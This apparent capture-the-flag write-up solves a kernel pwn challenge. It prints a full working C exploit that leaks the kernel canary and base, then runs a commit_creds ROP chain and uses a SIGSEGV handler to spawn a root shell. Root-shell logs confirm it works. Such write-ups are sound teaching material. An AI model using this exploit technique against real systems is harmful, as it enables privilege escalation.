---
layout: post
title: "SIGSEGV??? Thanks I'll be root"
categories: Pwn Kernel
tags: Hacking Pwn
---

##K3RN3L CTF 2021 easy kernel
In this blog I will use this "easyish" challenge to introduce a cool technique that exploit SIGNAL HANDLER.

<!--excerpt-->

# SIGNAL Example

Here is an example of why signal() can be useful for getting root.

    ctf@ctf-virtual-machine:~/ez_kernel$ cat poc.c
    #include <signal.h>
    #include <stdio.h>
    
    
    void pocc(void){
    	system("ls");
    	exit(0);
    }
    
    int main(){
    	signal(SIGSEGV, pocc);
    
    	char buffer[16];
    	gets(buffer);
    	return 0;
    }
    ctf@ctf-virtual-machine:~/ez_kernel$ cyclic 60| ./poc 
    bzImage  fs  initramfs.cpio.gz	launch_pow.sh  launch.sh  poc  poc.c  rebuild_fs.sh  vuln.ko

So we can use this to deal with sigsegv when returning in userland...

# Initial Analysis

We can do a bof with rop-fu because of this function:

    00000050  int64_t swrite(int64_t arg1, int64_t arg2, int64_t arg3)
    
    00000058      void* gsbase
    00000058      int64_t rax = *(gsbase + 0x28)
    00000075      if (sx.q(MaxBuffer) u< arg3)
    000001e3          printk(0x310)
    00000081      else
    00000081          void var_90
    00000081          int32_t rax_2
    00000081          int64_t rsi
    00000081          int64_t rdi_1
    00000081          rax_2, rsi, rdi_1 = copy_user_generic_unrolled(&var_90)
    00000088          if (rax_2 == 0)
    00000088              return swrite.cold(arg3, rdi_1, rsi) __tailcall
    000000a6      if (rax != *(gsbase + 0x28))
    000000b1          __stack_chk_fail()
    000000b1          noreturn
    000000b0      return -0xe

And can leak stuff with this function:

    000000c0  int64_t sread(int64_t arg1, int64_t arg2, int64_t arg3)
    
    000000ce      void* gsbase
    000000ce      int64_t rax = *(gsbase + 0x28)
    000000ee      int64_t var_90
    000000ee      __builtin_strcpy(dest: &var_90, src: "Welcome to this kernel pwn series")
    00000129      int32_t rax_1
    00000129      int64_t rsi_1
    00000129      int64_t rdi_1
    00000129      rax_1, rsi_1, rdi_1 = copy_user_generic_unrolled(arg2, &var_90)
    00000130      if (rax_1 == 0)
    00000130          return sread.cold(arg3, rdi_1, rsi_1) __tailcall
    0000014e      if (rax != *(gsbase + 0x28))
    00000159          __stack_chk_fail()
    00000159          noreturn
    00000158      return -0xe

As we can see there is kernel stack cookie as mitigation.. speaking of here is our lunch script that reveals the protection:

    #!/bin/bash
    
    SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
    
    timeout --foreground 180 /usr/bin/qemu-system-x86_64 \
    	-m 64M \
    	-cpu kvm64,+smep,+smap \
    	-kernel $SCRIPT_DIR/bzImage \
    	-initrd $SCRIPT_DIR/initramfs.cpio.gz \
    	-nographic \
    	-monitor none \
    	-append "console=ttyS0 kaslr quiet panic=1" \
    	-no-reboot \
    	-gdb tcp: 12345 # added by me for debugging

And to compile and send the binary I wrote those few lines:

    gcc exploit.c -o exploit -static
    cp exploit fs/
    ./rebuild_fs.sh
    ./launch.sh

# Leak
As always here is the fuzzy c code to leak the stack:

    for (int i=1; i<25; i++){
            unsigned long leak[i];
            read(fd, leak, sizeof(leak));
            for (int j=0; j<i; j++){
                    printf("Cycle: %d ||| Idx: %d ||| Content: %lx\n",i, j, leak[j]);
            }
    }

And we get:

    [...]
    [   55.272215] 192 bytes read from device
    Cycle: 24 ||| Idx: 0 ||| Content: 20656d6f636c6557
    Cycle: 24 ||| Idx: 1 ||| Content: 2073696874206f74
    Cycle: 24 ||| Idx: 2 ||| Content: 70206c656e72656b
    Cycle: 24 ||| Idx: 3 ||| Content: 6569726573206e77
    Cycle: 24 ||| Idx: 4 ||| Content: ffff982400130073
    Cycle: 24 ||| Idx: 5 ||| Content: 20000035a9000
    Cycle: 24 ||| Idx: 6 ||| Content: ffff982400136910
    Cycle: 24 ||| Idx: 7 ||| Content: 100020000
    Cycle: 24 ||| Idx: 8 ||| Content: 0
    Cycle: 24 ||| Idx: 9 ||| Content: ffff982400000000
    Cycle: 24 ||| Idx: 10 ||| Content: 0
    Cycle: 24 ||| Idx: 11 ||| Content: 0
    Cycle: 24 ||| Idx: 12 ||| Content: 0
    Cycle: 24 ||| Idx: 13 ||| Content: 0
    Cycle: 24 ||| Idx: 14 ||| Content: 9244ca3dbc6c9b00
    Cycle: 24 ||| Idx: 15 ||| Content: c0
    Cycle: 24 ||| Idx: 16 ||| Content: 9244ca3dbc6c9b00
    Cycle: 24 ||| Idx: 17 ||| Content: c0
    Cycle: 24 ||| Idx: 18 ||| Content: ffffffffba23e347
    Cycle: 24 ||| Idx: 19 ||| Content: 1
    Cycle: 24 ||| Idx: 20 ||| Content: 0
    Cycle: 24 ||| Idx: 21 ||| Content: ffffffffba1c89f8
    Cycle: 24 ||| Idx: 22 ||| Content: ffff982400136900
    Cycle: 24 ||| Idx: 23 ||| Content: ffff982400136900

We can see that at index 14/16 there is the kernel canary, the kernel base is at index  18/21 but we need to modify something, I chose the one at index 21 because is smaller...

    pwndbg> xinfo 0xffffffffba1c89f8
    Extended information for virtual address 0xffffffffba1c89f8:
    
      Containing mapping:
    0xffffffffba000000 0xffffffffba493000 rwxp   493000      0 <explored>
    
      Offset information:
             Mapped Area 0xffffffffba1c89f8 = 0xffffffffba000000 + 0x1c89f8

So we can translate this into c code:

    unsigned long canary;
    unsigned long kbase;

    unsigned long leak[24];
    read(fd, leak, sizeof(leak));
    canary = leak[16];
    kbase = leak[21]: 0x1c89f8;
    
Running it we get:
    
  

      ~ $ /exploit 
        [   18.702517] Device opened
        Device Opened!
        [   18.703565] 192 bytes read from device
        Canary: 98aeb1efa100ee00
        Kernel Base: ffffffffb8c00000
        [   18.705211] All device's closed

# Exploit.

If we analyze the swrite function we can see there is a costraint:

    if (sx.q(MaxBuffer) u< arg3)

trying with the fuzzy writes we get this as response:

    Your chosen size is too large

Because initial buffer size is 0x40 so we need to increase it, how?

    0000017e  int64_t sioctl(int64_t arg1, int32_t arg2, int64_t arg3)
    
    0000018c      printk(0x2a8)
    00000194      if (arg2 == 0x10)
    000001ad          printk(0x2b8, arg3)
    00000199      else if (arg2 != 0x20)
    000001bb          printk(0x2ce)
    0000019b      else
    0000019b          MaxBuffer = arg3.d
    000001c4      return 0

In the sioctl function if we do something like ioctl(fd, 0x20, int x) MaxBuffer will be equals to x... 

    ioctl(fd, 0x20, 240);

    for (int i=10; i<25; i++){
            unsigned long payload[i];
            write(fd, payload, sizeof(payload));
            printf("Offset: %d\n", i);
    }

Running it we get:

    Offset: 16
    [    4.073432] 136 bytes written to device
    [    4.075363] Kernel panic: not syncing: stack-protector: Kernel stack is corrupted in: swrite+0x66/0x70 [vuln]
    [    4.076924] CPU: 0 PID: 97 Comm: exploit Tainted: G           O      5.4.0 #1
    [    4.077650] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
    [    4.081782] Call Trace:
    [    4.082975]  dump_stack+0x50/0x70
    [    4.083323]  panic+0xf6/0x2b7
    [    4.083550]  ? swrite+0x66/0x70 [vuln]
    [    4.083866]  __stack_chk_fail+0x10/0x10
    [    4.084106]  swrite+0x66/0x70 [vuln]
    [    4.084437]  proc_reg_write+0x37/0x60
    [    4.084762]  vfs_write+0xb1/0x190
    [    4.084961]  ksys_write+0x5a/0xd0
    [    4.085275]  do_syscall_64+0x43/0x110
    [    4.085603]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
    [    4.086092] RIP: 0033:0x44f4d7
    [    4.086671] Code: ff ff f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb b7 0f 1f 00 f3 0f 1e fa 64 8b 04 25 18 00 00 00 85 c0 75 10 b8 01 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 51 c3 48 83 4
    [    4.089938] RSP: 002b:00007ffd22c68aa8 EFLAGS: 00000246 ORIG_RAX: 0000000000000001
    [    4.090807] RAX: ffffffffffffffda RBX: 00007ffd22c68b40 RCX: 000000000044f4d7
    [    4.091448] RDX: 0000000000000088 RSI: 00007ffd22c68ab0 RDI: 0000000000000003
    [    4.092454] RBP: 00007ffd22c68c70 R08: 0000000000000000 R09: 0000000000000000
    [    4.093167] R10: 000000000000000a R11: 0000000000000246 R12: 0000000000000011
    [    4.093815] R13: 0000000000000000 R14: 0000000000000011 R15: 0000000000000000
    [    4.094955] Kernel Offset: 0x2a200000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)

 
I modified init in fs/ adding those lines just before the exec

    echo 0 > /proc/sys/kernel/kptr_restrict
    echo 0 > /proc/sys/kernel/perf_event_paranoid
    echo 0 > /proc/sys/kernel/dmesg_restrict

So we can read address from /proc/kallsyms, this time the privilege escalation technique will be the more known
`commit_creds(prepare_kernel_cred(0))` , so we need `pop rdi` to put 0 in prepare_kernel_cred.. the rest of ropchain is kinda the same so we need to return to userland. What changed from the others payload is that we need to create a function for our signal:

    void get_root(){
            if (getuid() == 0){
                    printf("And we are root\n");
                    system("/bin/sh");
            }else{
                    printf("Not root\n");
                    exit(0);
            }
    }

So our final exploit is:
```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <signal.h>

int fd;

unsigned long user_cs, user_ss, user_sp, user_rflags;
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

void get_root(){
	if (getuid() == 0){
		printf("And we are root\n");
		system("/bin/sh");
	}else{
		printf("Not root\n");
		exit(0);
	}
}

int main(){

	save_state();

	fd = open("/proc/pwn_device", O_RDWR);
	if (fd < 0){
		printf("Cannot Open Device\n");
		return -1;
	}
	printf("Device Opened!\n");

	/*
	for (int i=1; i<25; i++){
		unsigned long leak[i];
		read(fd, leak, sizeof(leak));
		for (int j=0; j<i; j++){
			printf("Cycle: %d |||  Idx: %d ||| Content: %lx\n",i, j, leak[j]);
		}
	}
	*/

	unsigned long canary;
	unsigned long kbase;

	unsigned long leak[24];
	read(fd, leak, sizeof(leak));
	canary = leak[16];
	kbase = leak[21] - 0x1c89f8;

	printf("Canary: %lx\n", canary);
	printf("Kernel Base: %lx\n", kbase);

	ioctl(fd, 0x20, 320);

	signal(SIGSEGV, get_root);

	/*
	for (int i=10; i<25; i++){
		unsigned long payload[i];
		write(fd, payload, sizeof(payload));
		printf("Offset: %d\n", i);
	}
	*/

	unsigned long pop_rdi = kbase + 0x1518;
	unsigned long iretq = kbase + 0x23cc2;
	unsigned long commit_creds = kbase + 0x87e80;
	unsigned long prepare_kernel_cred = kbase + 0x881c0;
	unsigned long swapgs = kbase + 0xc00eaa;

	unsigned long payload[40];
	int offset = 16;
	payload[offset++] = canary;
	payload[offset++] = kbase;
	payload[offset++] = pop_rdi;
	payload[offset++] = 0x0;
	payload[offset++] = prepare_kernel_cred;
	payload[offset++] = commit_creds;
	payload[offset++] = swapgs;
	payload[offset++] = 0x0;
	payload[offset++] = iretq;
	payload[offset++] = (unsigned long) get_root;
	payload[offset++] = user_cs;
	payload[offset++] = user_rflags;
	payload[offset++] = user_sp;
	payload[offset++] = user_ss;
	write(fd, payload, sizeof(payload));
	return 0;
}
```
Running it we get:
```
    ~ $ id
    uid=1000(ctf) gid=1000 groups=1000
    ~ $ /exploit 
    [    6.434303] Device opened
    Device Opened!
    [    6.440432] 192 bytes read from device
    Canary: 1dbfb58daac4400
    Kernel Base: ffffffffb7a00000
    [    6.444898] IOCTL Called
    [    6.445939] 320 bytes written to device
    And we are root
    /bin/sh: can't access tty; job control turned off
    /home/ctf # id
    uid=0(root) gid=0
    /home/ctf # cat /flag.txt 
    flag{test_flag}
   ```
If we remove the signal handler we would get:
```
~ $ /exploit 
[   12.980839] Device opened
Device Opened!
[   12.983142] 192 bytes read from device
Canary: 8ebd624954d0bd00
Kernel Base: ffffffffa8600000
[   12.985931] IOCTL Called
[   12.986503] 320 bytes written to device
[   12.992062] All device's closed
Segmentation fault
```

So despite the fact that is a shorter post also like finding rop gadgets or functions in /proc/kallsyms should be clear from the first kernel post I made... so as you saw I take them as trivial and the reader can do on its way.
